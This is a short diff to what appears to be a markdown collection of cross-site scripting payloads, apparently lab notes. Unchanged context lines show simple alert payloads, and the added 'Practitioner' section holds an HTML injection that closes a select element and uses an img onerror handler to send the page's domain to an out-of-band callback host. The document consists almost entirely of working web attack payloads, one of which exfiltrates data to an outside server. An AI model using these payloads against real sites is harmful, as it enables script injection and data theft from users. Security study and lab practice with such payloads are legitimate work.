@@ -37,3 +37,13 @@ javascript:alert(1)
 ```js
 ';alert(1)//
 ```
+
+
+# Practitioner
+
+
+```html
+"></select><img src=1 onerror="location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;">
+```
+
+
